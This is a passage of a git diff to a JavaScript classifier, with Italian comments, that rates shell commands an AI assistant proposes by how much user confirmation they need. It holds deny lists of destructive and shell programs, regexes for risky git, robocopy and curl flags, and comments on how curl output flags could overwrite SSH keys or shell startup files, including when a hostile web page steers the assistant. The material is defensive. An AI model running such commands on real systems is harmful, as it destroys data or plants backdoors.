@@ -77,29 +77,25 @@
 (function (global) {
   'use strict';
 
-  // Metacaratteri che rendono il comando composto/non riconoscibile → 3.
-  // (`-` di `&&`/`||` è coperto da `&`/`|`.)
+  // Metacaratteri che rendono il comando composto o non riconoscibile → 3.
   const CHAIN_RE = /[|;&`<>]|\$\(|\$\{|\r|\n/;
 
-  // Programmi che eseguono codice arbitrario o distruggono stato: SEMPRE 3,
-  // controllati per primi (backstop anche se finissero in una whitelist).
+  // Codice arbitrario o distruzione di stato: SEMPRE 3, controllati per primi, backstop
+  // anche se finissero in una whitelist.
   const ALWAYS_3 = new Set([
-    // cancellazioni
     'rm', 'rmdir', 'rd', 'del', 'erase', 'unlink', 'deltree', 'shred',
-    // catastrofici / sistema
     'format', 'mkfs', 'fdisk', 'diskpart', 'dd', 'shutdown', 'reboot',
     'restart', 'halt', 'poweroff', 'kill', 'killall', 'taskkill', 'pkill',
     'reg', 'regedit', 'sc', 'net', 'netsh', 'fsutil', 'bcdedit', 'mklink',
     'chmod', 'chown', 'chgrp', 'attrib', 'icacls', 'takeown',
-    // shell ed esecutori diretti: SEMPRE 3 (anche `bash` da solo apre una
-    // sessione interattiva; nessuna eccezione "versione").
+    // Shell ed esecutori diretti: SEMPRE 3, senza l'eccezione «versione» — anche `bash` da
+    // solo apre una sessione interattiva.
     'sh', 'bash', 'zsh', 'fish', 'powershell', 'pwsh', 'cmd', 'eval', 'exec',
     'ssh', 'scp', 'sudo', 'su', 'doas',
   ]);
 
-  // Interpreti / build tool / runner: eseguono codice arbitrario → livello 3,
-  // ECCEZIONE: una pura interrogazione di versione/help (`node --version`,
-  // `python -V`, `go version`, `docker --help`…) è sola lettura → livello 1.
+  // Interpreti, build tool e runner eseguono codice arbitrario → 3. Eccezione: la pura
+  // interrogazione di versione o aiuto è sola lettura → 1.
   const ARBITRARY_CODE = new Set([
     'node', 'deno', 'bun', 'ts-node', 'tsx', 'python', 'python3', 'py', 'ruby',
     'perl', 'php', 'osascript', 'npx', 'pnpm', 'yarn', 'make', 'cmake', 'cargo',
@@ -109,17 +105,15 @@
     'code', 'rustup', 'rbenv', 'pyenv', 'nvm', 'composer', 'bundle', 'gem',
   ]);
 
-  // Token che da soli rendono un comando una pura interrogazione (lettura):
-  // versione o aiuto. `-v`/`-V` qui valgono "version" (vero per i tool sopra);
-  // l'ambiguità `-v`=verbose non danneggia, perché un `cmd -v` senza operandi
-  // non compie alcuna azione.
+  // Token che da soli rendono il comando una pura interrogazione. `-v`/`-V` qui valgono
+  // «version»: un `cmd -v` senza operandi non compie nessuna azione.
   const VERSION_TOKENS = new Set([
     '--version', '-version', '-v', '-V', 'version', '--help', '-help', '-h',
     'help', '/?', '/version', '--usage', '-?',
   ]);
 
-  // Il comando è SOLO programma + token di versione/help (almeno uno: un
-  // programma "nudo" come `node` apre invece un REPL e non è lettura sicura).
+  // Serve almeno un token di versione o aiuto: un programma nudo come `node` apre un REPL
+  // e non è lettura sicura.
   function isVersionQuery(cmd) {
     const rest = tokens(cmd).slice(1);
     if (!rest.length) return false;
@@ -128,41 +122,29 @@
 
   // Sola lettura, nessun effetto sullo stato: livello 1.
   const LEVEL1 = new Set([
-    // `cd`/`chdir`: cambia solo la cartella di lavoro (effetto benigno e
-    // pienamente reversibile, nessuna modifica su disco). È la primitiva di
-    // navigazione dell'assistente: la cwd è persistente tra i suoi comandi, e
-    // pretendere di digitare "conferma" a ogni spostamento la renderebbe
-    // inutilizzabile. I `cd` con metacaratteri ($(...), ;, &&…) restano 3 via
-    // CHAIN_RE.
+    // `cd` cambia solo la cartella di lavoro ed è la primitiva di navigazione dell'assistente:
+    // chiedere conferma a ogni spostamento la renderebbe inutilizzabile.
     'cd', 'chdir',
     'ls', 'dir', 'pwd', 'cat', 'type', 'echo', 'whoami', 'hostname', 'date',
     'where', 'which', 'head', 'tail', 'tree', 'wc', 'ver', 'uname', 'more',
     'clear', 'cls', 'grep', 'findstr', 'stat', 'basename', 'dirname',
     'realpath', 'readlink', 'du', 'df', 'uptime', 'id', 'groups', 'whatis',
     'cal', 'nproc', 'arch',
-    // diagnostica comune di sola lettura
     'ps', 'free', 'lscpu', 'lsblk', 'lsusb', 'printenv', 'whereis', 'who',
     'w', 'vmstat', 'lsof', 'column', 'cut', 'uniq', 'nl', 'file',
     'md5sum', 'sha1sum', 'sha256sum', 'cksum',
   ]);
 
-  // Alcuni programmi LEVEL1 sono di sola lettura SOLO finché non ricevono gli
-  // argomenti che ne cambiano il senso: `date` legge l'orologio ma `date -s`/
-  // `--set` lo IMPOSTA, `hostname` stampa il nome ma `hostname <nome>` lo
-  // CAMBIA. Senza tali argomenti restano livello 1; con essi salgono a livello 2
-  // (conferma), perché modificano lo stato del sistema in modo recuperabile.
-  // Ogni predicato riceve il comando intero e ritorna true se MODIFICA lo stato.
+  // Alcuni LEVEL1 leggono finché non ricevono gli argomenti che ne cambiano il senso: `date`
+  // legge, `date -s` IMPOSTA. Il predicato riceve il comando intero e torna true se MODIFICA.
   const LEVEL1_MUTATES = {
-    // `date -s "..."` / `date --set=...` imposta l'orologio; le altre forme
-    // (`date`, `date +%F`, `date -u`, `date -d "ieri"`) sono letture.
+    // `date -s`/`--set` imposta l'orologio; `+%F`, `-u`, `-d` sono letture.
     date: (cmd) => /(^|\s)(-s|--set)(=|\s|$)/i.test(cmd),
-    // `hostname <nome>` (un operando non-flag) o `hostname -F file` imposta il
-    // nome host; i flag di lettura (-f, -I, -i, -d, -s, -A, -a…) non cambiano
-    // nulla. Nota: qui `-s` = "short" (lettura), NON "set".
+    // `hostname <nome>` o `-F file` imposta il nome host; i flag di lettura no.
+    // Attenzione: qui `-s` è «short», non «set».
     hostname: (cmd) => {
       const rest = tokens(cmd).slice(1);
-      // `-F`/`--file` (imposta il nome da file) è case-sensitive: `-f` = fqdn
-      // è lettura, NON deve combaciare.
+      // `-F`/`--file` è case-sensitive: `-f` = fqdn è lettura e non deve combaciare.
       return rest.some((t) => /^(-F|--file)$/.test(t) || !t.startsWith('-'));
     },
   };
@@ -174,27 +156,8 @@
     'ln',
   ]);
 
-  // ── PowerShell: cmdlet di sola lettura e pipeline di sole letture ─────────
-  //
-  // Su Windows la shell di Filo È PowerShell (src/main/services/terminal.js), e
-  // un LLM che scrive PowerShell naturale usa `Get-ChildItem` e le pipeline, non
-  // `ls`. Prima di questo blocco OGNI cmdlet e OGNI pipeline cadevano nel ramo
-  // "non riconosciuto" → livello 3: elencare una cartella costava all'utente la
-  // stessa frizione di un `rm -rf` (misurato su un banco con modelli reali: 26
-  // comandi bloccati su 33, quasi tutti letture innocue).
-  //
-  // Il rimedio resta il principio del file — WHITELIST, l'ignoto è 3 — applicato
-  // ai cmdlet. Criterio di ammissione: entra solo il cmdlet che NON ha una forma
-  // capace di scrivere. In PowerShell è la norma, perché il gemello che scrive è
-  // sempre un ALTRO verbo (Get-Item legge, Set-Item scrive; Get-Content legge,
-  // Set-Content/Out-File/Tee-Object scrivono; Get-Process legge, Stop-Process
-  // uccide; Get-Date legge l'orologio, Set-Date lo imposta): il cmdlet in lista
-  // non ha quindi flag distruttivi da intercettare come in LEVEL1_MUTATES —
-  // basta che il gemello che scrive resti FUORI, dove il default lo tiene a 3.
-  // Restano fuori di proposito anche i cmdlet di sola lettura ma con una
-  // superficie troppo larga o ambigua (Get-CimInstance/Get-WmiObject, che
-  // arrivano ovunque nel sistema; Get-Credential, che apre una richiesta di
-  // password; Measure-Command, che ESEGUE lo scriptblock che riceve).
+  // Su Windows la shell è PowerShell: senza questa whitelist elencare una cartella costava la
+  // frizione di un `rm -rf`. Entra solo il cmdlet che NON ha una forma capace di scrivere.
   const PS_READ = new Set([
     'get-childitem', 'gci', 'get-content', 'gc', 'get-item', 'gi',
     'get-itemproperty', 'gp', 'get-itempropertyvalue', 'get-location', 'gl',
@@ -209,39 +172,20 @@
     'out-string', 'out-host', 'out-null', 'write-output', 'write-host',
     'convertto-json', 'convertfrom-json', 'convertto-csv', 'convertfrom-csv',
     'convertfrom-stringdata', 'get-filehash',
-    // Navigazione pura: cambiano solo la cartella di lavoro, come `cd` (che è
-    // già livello 1). `Set-Location`/`sl`, `pushd`/`popd` sono le forme
-    // PowerShell dello stesso gesto benigno e reversibile.
+    // Navigazione pura: come `cd`, cambiano solo la cartella di lavoro.
     'set-location', 'sl', 'pushd', 'popd',
   ]);
-  // Alias VOLUTAMENTE esclusi perché su un'altra shell sono un programma che
-  // SCRIVE, e il classificatore non sa quale shell eseguirà il comando: `sort`
-  // (Sort-Object in PowerShell, ma `sort -o file` su Unix scrive un file), `gm`
-  // (Get-Member, ma anche GraphicsMagick, che converte e sovrascrive immagini),
-  // `gcm` (Get-Command, ma anche git-credential-manager, che cancella
-  // credenziali), `compare` (Compare-Object, ma anche ImageMagick, che scrive
-  // l'immagine di confronto). I nomi lunghi corrispondenti restano ammessi.
+  // Alias esclusi apposta perché su un'altra shell sono un programma che SCRIVE (`sort`,
+  // `gm`, `gcm`, `compare`), e non si sa quale shell eseguirà. I nomi lunghi restano ammessi.
 
-  // Where-Object/ForEach-Object (e gli alias `?`, `%`, `where`, `foreach`) hanno
-  // senso solo DENTRO una pipeline: da soli non ricevono niente da filtrare.
+  // Valgono solo DENTRO una pipeline: da soli non ricevono niente da filtrare.
   const PS_PIPE_ONLY = new Set(['where-object', 'where', '?', 'foreach-object', 'foreach', '%']);
-  // ForEach-Object senza scriptblock usa la forma "nome di membro", che INVOCA
-  // il metodo su ogni oggetto: `Get-ChildItem | % Delete` CANCELLA i file. Quindi
-  // per questi lo scriptblock (validato) è obbligatorio.
+  // ForEach-Object senza scriptblock usa la forma «nome di membro», che INVOCA il metodo su
+  // ogni oggetto: `gci | % Delete` cancella i file. Lo scriptblock validato è obbligatorio.
   const PS_FOREACH = new Set(['foreach-object', 'foreach', '%']);
 
-  // Uno SCRIPTBLOCK `{ … }` è il buco naturale della pipeline: `gci | % {
-  // Remove-Item $_ }` è una cancellazione travestita da lettura. Non proviamo a
-  // classificare cosa c'è dentro (sarebbe interpretare PowerShell): pretendiamo
-  // che il blocco sia INERTE, cioè che non contenga NESSUN token in posizione di
-  // comando. Passano proprietà, confronti, operatori e numeri (`{ $_.Length -gt
-  // 1000 }`); non passa niente che possa invocare qualcosa — parole nude
-  // (`Remove-Item`, `ri`, `foobar`), percorsi di eseguibili (`.\x.exe`),
-  // dot-sourcing, chiamate di metodo `(`, assegnazioni `=`, membri statici `::`.
-  // I LETTERALI FRA VIRGOLETTE sono già stati neutralizzati a `0` da chi chiama
-  // (segmentIsRead): un confronto `-eq "readme.md"` è inerte, la stringa non è
-  // un comando. È volutamente più severo del necessario: un blocco di lettura
-  // respinto costa una conferma in più, uno ostile accettato costa i file.
+  // Uno scriptblock è il buco della pipeline: `gci | % { Remove-Item $_ }` è una cancellazione
+  // travestita. Non si interpreta il contenuto: si pretende INERTE, nessun token che invochi.
   function scriptBlockIsInert(inner) {
     const s = String(inner);
     if (/[=(){}`;&|<>@]|::/.test(s)) return false;
@@ -253,28 +197,20 @@
     return true;
   }
 
-  // Un SEGMENTO (comando singolo, o un pezzo di pipeline) è di sola lettura?
-  // Serve sia per il cmdlet isolato sia per ogni pezzo di una pipeline, così i
-  // due cammini non possono divergere. Riceve il segmento GREZZO (con le
-  // virgolette): i letterali quotati vanno riconosciuti come inerti PRIMA di
-  // togliere le virgolette, altrimenti una parola quotata resta nuda e sembra un
-  // comando.
+  // Stessa funzione per il cmdlet isolato e per ogni pezzo di pipeline, così i due cammini
+  // non divergono. Riceve il segmento GREZZO: i letterali quotati vanno visti prima.
   function segmentIsRead(seg, inPipeline) {
-    // `%{...}` e `?{...}` (senza spazio) sono scrittura PowerShell normalissima:
-    // isoliamo le graffe come token a sé prima di guardare programma e blocco.
+    // `%{...}` e `?{...}` senza spazio sono PowerShell normale: le graffe si isolano come
+    // token a sé prima di guardare programma e blocco.
     const norm = String(seg).replace(/\{/g, ' { ').replace(/\}/g, ' } ');
-    // Il primo token deve essere il comando NUDO, non un file omonimo su disco
-    // (`.\Get-ChildItem.exe`): senza questo, `programOf` (che fa basename e
-    // toglie l'estensione) lo scambierebbe per il cmdlet fidato.
+    // Il primo token dev'essere il comando NUDO: senza `isBareName` un file su disco chiamato
+    // come il cmdlet fidato verrebbe scambiato per lui.
     if (!isBareName(tokens(norm)[0])) return false;
-    // I letterali fra virgolette sono inerti: li rimpiazziamo con `0` (un numero,
-    // che scriptBlockIsInert accetta). Così un confronto `-eq "readme.md"` passa,
-    // e un metacarattere DENTRO le virgolette non fa salire il livello. Ciò che
-    // invoca davvero (parole nude, `&`, `(`, `.`) sta FUORI dalle virgolette e
-    // viene comunque intercettato.
+    // I letterali fra virgolette sono inerti e diventano `0`: un confronto con una stringa passa
+    // e un metacarattere dentro le virgolette non alza il livello. Ciò che invoca sta fuori.
     const noStr = norm.replace(/'[^']*'/g, ' 0 ').replace(/"[^"]*"/g, ' 0 ');
-    // Sottoespressioni, chiamate, hashtable/array, redirezioni, operatore di
-    // chiamata, membri statici: dentro può nascondersi qualunque cosa.
+    // Sottoespressioni, chiamate, hashtable, redirezioni, membri statici: dentro può
+    // nascondersi qualunque cosa.
     if (/[`()<>;&|@]|\$\(|\$\{|::/.test(noStr)) return false;
     const open = (noStr.match(/\{/g) || []).length;
     const close = (noStr.match(/\}/g) || []).length;
@@ -292,15 +228,13 @@
       return PS_FOREACH.has(prog) ? open === 1 : true;
     }
     if (PS_READ.has(prog)) return true;
-    // Dentro una pipeline vale come lettura anche tutto ciò che il
-    // classificatore riconosce già come livello 1 (`ls`, `cat`, `grep`, `head`,
-    // `git log`…): `cat file | grep errore` non compie nulla di più di `cat file`.
+    // In pipeline vale come lettura anche ciò che è già livello 1: `cat file | grep errore`
+    // non compie niente di più di `cat file`.
     return inPipeline && classifyOne(seg) === 1;
   }
 
-  // Il comando è una pura PIPELINE (solo `|`), senza sequenziamento, background,
-  // redirezioni o sostituzioni? Ritorna i segmenti, altrimenti null. Nota: `||`
-  // produce un segmento vuoto e fa fallire il controllo, quindi non passa di qui.
+  // Pura pipeline (solo `|`), senza sequenze, background, redirezioni o sostituzioni:
+  // i segmenti, altrimenti null. `||` produce un segmento vuoto e non passa di qui.
   function splitSafePipeline(cmd) {
     if (/[`<>;&]|\$\(|\$\{|\r|\n/.test(cmd)) return null;
     if (cmd.indexOf('|') === -1) return null;
@@ -312,38 +246,12 @@
   // Flag che alzano a 3 un comando altrimenti ≤2.
   const DANGEROUS_FLAG_RE = /(^|\s)(--force|--hard|--delete|--prune|--no-preserve-root|-[a-z]*f[a-z]*r[a-z]*|-[a-z]*r[a-z]*f[a-z]*)(\s|$)/i;
 
-  // robocopy: i flag distruttivi Windows usano lo slash, non il trattino, quindi
-  // DANGEROUS_FLAG_RE (stile Unix) NON li vede. `robocopy SRC DST /MIR` e
-  // `/PURGE` CANCELLANO in modo permanente (bypassando il Cestino) i file nella
-  // destinazione che non esistono nella sorgente — un `rm -rf` mirato mascherato
-  // da "copia" → devono chiedere di digitare "conferma" (3), non un semplice OK
-  // (2). `/MOVE` e `/MOV` spostano cancellando i file dalla SORGENTE dopo la
-  // copia: se la sorgente è quella sbagliata (o pilotata da una pagina ostile) si
-  // svuota una cartella non voluta → stessa classe distruttiva. Check
-  // robocopy-specifico e case-insensitive (i flag Windows lo sono): applicarlo a
-  // ogni comando globalmente rischierebbe falsi positivi con path Unix tipo
-  // `cp /mir file` (una cartella chiamata "mir"); solo robocopy usa questi flag.
+  // robocopy usa lo slash, che DANGEROUS_FLAG_RE non vede: `/MIR` e `/PURGE` cancellano la
+  // destinazione, `/MOVE` la sorgente. Check a sé e case-insensitive, o falsi positivi Unix.
   const ROBOCOPY_DESTRUCTIVE_RE = /(^|\s)\/(MIR|PURGE|MOVE|MOV)(\s|$)/i;
 
-  // curl con un flag di OUTPUT-SU-FILE scrive i byte scaricati in un
-  // percorso scelto da chi lancia il comando (l'LLM, potenzialmente pilotato da
-  // una pagina ostile): può SOVRASCRIVERE qualsiasi file — chiavi SSH
-  // (~/.ssh/authorized_keys), script d'avvio della shell (~/.bashrc, ~/.profile)
-  // — trasformando un "download" in una backdoor. È qualitativamente più grave
-  // del semplice download (che scrive su stdout o al più nella cwd): alza a 3
-  // (digita "conferma"), come i flag distruttivi di git. Coperti (anche in
-  // bundle di short-flag tipo `-sLo`): -o/--output(-dir/-document),
-  // -O/--remote-name(-all), -J/--remote-header-name (nome del file scelto dal
-  // server). Non tentiamo di distinguere il percorso "sensibile" da quello
-  // innocuo: è inaffidabile (path relativi, ~, symlink, differenze OS) e un
-  // falso negativo qui = il buco di sicurezza; l'over-cautela costa solo attrito.
-  // Check curl-specifico (come GIT_DANGER_RE): un `-o` globale su `tar`/`zip`
-  // significherebbe altro. In un bundle di short-flag l'unico modo di avere una
-  // `o`/`O` è che sia il flag di output (curl -o/-O): gli altri short-flag di
-  // curl non contengono `o`, quindi `-[a-z]*o` non ha falsi positivi qui.
-  // `-J`/--remote-header-name senza -O è inerte, e con -O è già coperto da -O:
-  // non serve intercettare la `j` (che confliggerebbe con curl -j =
-  // --junk-session-cookies, innocuo). wget non passa di qui: è 3 comunque.
+  // curl con un flag di output-su-file scrive dove decide chi compone il comando e può
+  // sovrascrivere chiavi SSH o script d'avvio: un «download» diventa una backdoor → 3.
   const CURL_OUTPUT_RE = /(^|\s)(--output|--remote-name|--remote-header-name|-[a-z]*o)/i;
 
   // curl con `-D`/`--dump-header <file>` scrive gli header della risposta in un
@@ -355,50 +263,16 @@
   // solo `--dump-header`, anche in bundle (`-sD file`); `-d` è CURL_SEND_SHORT_RE.
   const CURL_DUMP_RE = /(^|\s)(--dump-header|-[a-zA-Z]*D)/;
 
-  // curl con flag che SALVANO DATI ACCESSORI in un percorso scelto da chi lancia
-  // il comando, con un contenuto comunque INFLUENZATO dal server (quindi da una
-  // pagina ostile che pilota l'assistente): -c/--cookie-jar (i cookie del sito),
-  // --etag-save (l'ETag della risposta), --trace/--trace-ascii (la traccia di
-  // debug della richiesta/risposta), --stderr (log/diagnostica di curl),
-  // --libcurl (il programma C equivalente, che contiene URL e header), --hsts e
-  // --alt-svc (le cache HSTS/Alt-Svc: curl le RILEGGE e le RISCRIVE con quanto
-  // dichiara il server, quindi creano/aggiornano il file indicato) e --metalink
-  // (tratta l'URL come un elenco XML di file da scaricare, coi nomi decisi
-  // dentro l'XML: disabilitato nelle build recenti, ma il classificatore non sa
-  // quale curl eseguirà il comando). Sono la
-  // stessa classe logica di -D/--dump-header — scrittura-su-file arbitraria di
-  // roba decisa dal remoto — solo più di nicchia e col contenuto più vincolato
-  // (formato cookie netscape, ETag quotato, dump esadecimale): l'iniezione è meno
-  // pulita ma il primitivo di scrittura resta, quindi salgono a 3 (digita
-  // "conferma") per simmetria col resto dei download. Check curl-specifico e
-  // case-SENSITIVE sulla `c`: `-c` (minuscolo, in curl SOLO --cookie-jar, scrive)
-  // alza anche in bundle (`-sc`, `-cs`); `-C`/--continue-at (MAIUSCOLO, riprende
-  // un download normale) NON deve salire. I long-flag di sola lettura simili
-  // (--cookie/-b legge i cookie, --etag-compare li confronta, --cacert/--cert
-  // leggono un certificato, --trace-time/--trace-ids sono modificatori senza
-  // file) NON combaciano: la parte long è ancorata con `(=|\s|$)` e il ramo short
-  // matcha solo la `c` minuscola in un bundle a trattino singolo.
+  // Altri flag curl che salvano dati influenzati dal server in un percorso scelto: stessa
+  // classe di --dump-header → 3. Case-SENSITIVE: `-C`/--continue-at non deve salire.
   const CURL_ACCESSORY_WRITE_RE = /(^|\s)(--cookie-jar|--etag-save|--trace(-ascii)?|--stderr|--libcurl|--hsts|--alt-svc|--metalink)(=|\s|$)|(^|\s)-[a-zA-Z]*c/;
 
-  // curl `-w`/`--write-out` è un formato di stampa, ma dal 2023 (curl 8.3)
-  // conosce `%output{FILE}`: da lì in poi il testo formattato non va più a
-  // schermo, va NEL FILE indicato (`%output{>>FILE}` accoda). È un flag "di
-  // formato" che in realtà fa atterrare un file scelto da chi compone il comando
-  // → stessa classe di `-o` → 3. Cerchiamo la direttiva, non il flag: `-w` senza
-  // `%output{` stampa e basta (`curl -s -w '%{http_code}' <url>` resta 2), e la
-  // direttiva non può nascondersi spezzata in due token, perché `%output{` deve
-  // arrivare a curl dentro un unico argomento (e `unquote` ricompone le
-  // virgolette incollate dentro il token, vedi `dequote`).
+  // curl `-w` è un formato di stampa, ma da 8.3 `%output{FILE}` lo fa atterrare su un file →
+  // stessa classe di `-o` → 3. Si cerca la direttiva, non il flag: `-w` da solo resta 2.
   const CURL_WRITE_OUT_FILE_RE = /%output\{/i;
 
-  // curl con `-K`/`--config <file>` LEGGE le opzioni da un file: dentro può
-  // esserci `output = /home/utente/.ssh/authorized_keys`, cioè lo stesso
-  // primitivo di scrittura di `-o` ma INVISIBILE nel testo del comando. L'effetto
-  // non è ispezionabile → vale il principio del file (ciò che non si riconosce è
-  // 3). Case-SENSITIVE sulla `K`: `-k`/`--insecure` (minuscolo, salta la verifica
-  // del certificato ma non scrive niente) NON deve salire; in curl la `K`
-  // maiuscola è solo `--config`, quindi anche in un bundle (`-sK cfg`) l'unica
-  // lettura possibile è quella.
+  // curl `-K`/`--config` legge le opzioni da un file, dove può esserci `output = …`: stesso
+  // primitivo di `-o` ma invisibile nel comando → 3. `-k`/`--insecure` non scrive niente.
   const CURL_CONFIG_RE = /(^|\s)(--config(=|\s|$)|-[a-zA-Z]*K)/;
 
   // curl che MANDA qualcosa al server (dati, un file, una mail, comandi FTP) o gli chiede di cambiare (un metodo
@@ -433,77 +307,46 @@
     'rebase', 'cherry-pick', 'revert', 'init', 'clone', 'mv',
     'apply', 'am', 'pop', 'worktree', 'submodule',
   ]);
-  // NB: 'checkout' e 'stash' NON stanno in GIT_WRITE: hanno forme DISTRUTTIVE che
-  // scartano lavoro non salvato (`git checkout .`/`-- <path>`, `git stash drop`/
-  // `clear`) e forme innocue (cambio ramo, salvataggio di uno stash). Il livello
-  // dipende dagli argomenti → li classifica GIT_DUAL qui sotto.
-  // I distruttivi di git (reset --hard, clean, branch -D, push --force…)
-  // li intercetta DANGEROUS_FLAG_RE o il fatto che siano fuori dalle due liste.
+  // `checkout` e `stash` non stanno in GIT_WRITE: hanno forme distruttive e forme innocue,
+  // quindi il livello dipende dagli argomenti e lo decide GIT_DUAL.
   const GIT_DESTROY = new Set(['reset', 'clean', 'rm', 'gc', 'filter-branch', 'update-ref', 'prune']);
 
-  // npm/pip: il livello dipende dal sotto-comando.
-  // NB: 'config' NON sta qui: `npm/pip config` è duale (get/list leggono, set/
-  // delete/edit CAMBIANO tra l'altro il registry dei pacchetti) → lo classifica
-  // classifyNpm guardando il verbo.
+  // npm/pip: il livello dipende dal sotto-comando. `config` non sta qui: è duale (get legge,
+  // set cambia anche il registry dei pacchetti) e lo classifica classifyNpm.
   const NPM_READ = new Set(['list', 'ls', 'view', 'show', 'outdated', 'root', 'bin', 'prefix', 'ping', 'doctor', 'whoami', 'help', 'search']);
   const NPM_WRITE = new Set(['install', 'i', 'ci', 'add', 'update', 'upgrade', 'uninstall', 'remove', 'rm', 'dedupe', 'prune', 'link', 'rebuild']);
-  // npm run / exec / start / test / publish → eseguono script arbitrari o
-  // pubblicano (irreversibile) → restano fuori → 3.
+  // npm run/exec/start/test/publish eseguono script arbitrari o pubblicano in modo
+  // irreversibile: restano fuori → 3.
 
   function tokens(cmd) {
-    // Spezza grezzamente su spazi; sufficiente per leggere programma e flag,
-    // dato che i comandi con quoting "interessante" finiscono comunque a 3.
+    // Spezzare sugli spazi basta per leggere programma e flag: i comandi con quoting
+    // interessante finiscono comunque a 3.
     return String(cmd).trim().split(/\s+/).filter(Boolean);
   }
 
-  // Le VIRGOLETTE non cambiano il comando che la shell esegue davvero, ma
-  // possono nascondere ai controlli sia il programma sia il bersaglio: bash,
-  // cmd e powershell collassano tutti `git checkout "."`, `git checkout .""`,
-  // `git checkout ""."` e `git stash d''rop` esattamente in `git checkout .` /
-  // `git stash drop`. Un controllo che guarda il testo grezzo vedrebbe un
-  // token sconosciuto e lascerebbe passare con la sola conferma leggera un
-  // comando che butta via lavoro non salvato (scenario "comando suggerito da
-  // una pagina ostile"). Quindi PRIMA di classificare togliamo TUTTE le
-  // virgolette dai token — non solo quelle che avvolgono il token intero, ma
-  // anche quelle vuote incollate prima/dopo/in mezzo.
-  //
-  // Non è un parser di shell (resta vero il principio del file: niente parsing
-  // del quoting) ed è sicuro per costruzione: togliere le virgolette può solo
-  // far RICONOSCERE più bersagli/flag pericolosi, cioè far salire il livello,
-  // mai scendere sotto quello che si vedrebbe altrimenti. Gli spazi dentro le
-  // virgolette non ci sfuggono: `tokens()` spezza comunque su spazi, e un
-  // comando così finisce nei rami cauti (più operandi = livello 3).
+  // Le virgolette non cambiano il comando che la shell esegue ma possono nascondere ai
+  // controlli programma e bersaglio: toglierle può solo far salire il livello, mai scendere.
   function unquote(tok) {
     return String(tok).replace(/['"]/g, '');
   }
 
-  // Comando con le virgolette rimosse token per token: la forma su cui girano
-  // tutti i controlli (whitelist di programmi, flag pericolosi, bersagli).
+  // La forma su cui girano tutti i controlli: whitelist, flag pericolosi, bersagli.
   function dequote(cmd) {
     return tokens(cmd).map(unquote).join(' ');
   }
 
   function programOf(cmd) {
     const first = tokens(cmd)[0] || '';
-    // togli quoting, prendi il basename, normalizza, togli estensioni eseguibili
     const bare = unquote(first);
     return bare.split(/[\\/]/).pop().toLowerCase().replace(/\.(exe|cmd|bat|ps1|com|msi)$/i, '');
   }
 
-  // Estensioni di file ESEGUIBILI: se il primo token ne ha una, quel token è un
-  // FILE su disco, non il comando di sistema che ne condivide il nome.
+  // Se il primo token ha un'estensione eseguibile è un FILE su disco, non il comando di
+  // sistema che ne condivide il nome.
   const EXE_EXT_RE = /\.(exe|cmd|bat|ps1|psm1|com|msi|vbs|vbe|wsf|wsh|scr|pif|cpl|msc|jar|js|jse|ps1xml)$/i;
 
-  // `programOf` fa il BASENAME del percorso e toglie l'estensione: serve al
-  // backstop dei distruttivi (`/bin/rm` deve restare 3 anche col percorso). Ma
-  // per FIDARSI di un comando (livello 1 o 2) quella normalizzazione è un buco:
-  // un eseguibile piantato in una cartella e chiamato come un cmdlet di lettura
-  // (`.\Get-ChildItem.exe`, `C:\tmp\ls.exe`, o `Get-ChildItem.exe` dal PATH)
-  // verrebbe scambiato per il cmdlet ed eseguito SENZA conferma. Un comando è
-  // "nudo" — cioè davvero quel comando di sistema, non un file omonimo — solo se
-  // il primo token non ha separatori di percorso, né un'estensione eseguibile,
-  // né un prefisso di chiamata (`.\`, `./`, `.`, `&`). Altrimenti è un programma
-  // arbitrario e la whitelist non lo copre → resta al livello 3 di default.
+  // `programOf` normalizza per il backstop (`/bin/rm` resta 3), ma per FIDARSI serve di più:
+  // un nome è «nudo» solo senza separatori, estensione eseguibile o prefisso di chiamata.
   function isBareName(tok) {
     const t = unquote(String(tok || ''));
     if (!t) return false;
@@ -522,44 +365,28 @@
     return '';
   }
 
-  // In git i flag distruttivi sono più ricchi: oltre a --force/--hard, anche
-  // -f (force su push/checkout/add), -d/-D (delete branch/tag, clean -d) e
-  // --delete/--prune. Un check git-specifico (più aggressivo del globale, che
-  // su comandi come `tar -f` significherebbe altro) → alza a 3.
-  // `--discard-changes` (checkout/switch) BUTTA VIA le modifiche non salvate del
-  // working tree tanto quanto `reset --hard`: qui perché è un flag che esiste solo
-  // per checkout/switch, entrambi distruttivi quando lo usano → sempre 3.
+  // In git i flag distruttivi sono più ricchi: anche `-f`, `-d`/`-D`, `--delete`, `--prune`.
+  // Check git-specifico, perché su `tar -f` quelle lettere vogliono dire altro.
   const GIT_DANGER_RE = /(^|\s)(--force(-with-lease)?|--hard|--delete|--prune|--discard-changes|-f|-d|-D|-[a-z]*f[a-z]*d[a-z]*|-[a-z]*d[a-z]*f[a-z]*)(\s|$)/i;
 
-  // Argomenti che seguono il sotto-comando git (esclusi programma e
-  // sotto-comando stesso). `git tag v1.0` → ['v1.0']; `git branch` → [];
-  // `git config --get user.name` → ['--get', 'user.name'].
+  // Argomenti dopo il sotto-comando: `git tag v1.0` → ['v1.0'], `git branch` → [].
   function gitArgsAfterSub(cmd) {
-    // Token già "spogliati" delle virgolette (vedi unquote): `git checkout ".."`
-    // e `git checkout ..` devono essere valutati allo stesso modo.
-    const t = tokens(cmd).slice(1).map(unquote).filter(Boolean); // via il programma `git`
+    // Token già spogliati: `git checkout ".."` e `git checkout ..` valgono uguale.
+    const t = tokens(cmd).slice(1).map(unquote).filter(Boolean);
     const i = t.findIndex((x) => !x.startsWith('-')); // posizione del sotto-comando
     return i < 0 ? [] : t.slice(i + 1);
   }
   const hasOperand = (args) => args.some((a) => !a.startsWith('-'));
 
-  // Varianti di un operando così come le interpreterebbero le shell supportate
-  // (bash, cmd, powershell): oltre alla forma già senza virgolette, quella con
-  // il backslash letto come ESCAPE (bash: `\.` → `.`) e quella con il backslash
-  // letto come SEPARATORE di percorso (Windows: `.\src` → `./src`). Se anche una
-  // sola lettura risulta distruttiva alziamo il livello: meglio una conferma
-  // forte di troppo che un comando che scarta lavoro con un semplice OK.
+  // Varianti di un operando come le leggerebbero le shell: senza virgolette, col backslash
+  // come escape (bash) e come separatore (Windows). Se una è distruttiva, si alza.
   function argVariants(arg) {
     const a = String(arg);
     return [a, a.replace(/\\(.)/g, '$1'), a.replace(/\\/g, '/')];
   }
 
-  // L'operando prende di mira dei FILE (pathspec) invece di un ramo/commit?
-  // `.`, `./`, `.\`, `..`, `src/`, `*.js`, percorsi assoluti, nomi con
-  // estensione: git li interpreta come percorsi e `git checkout <percorso>`
-  // SCARTA le modifiche non salvate di quei file, esattamente come
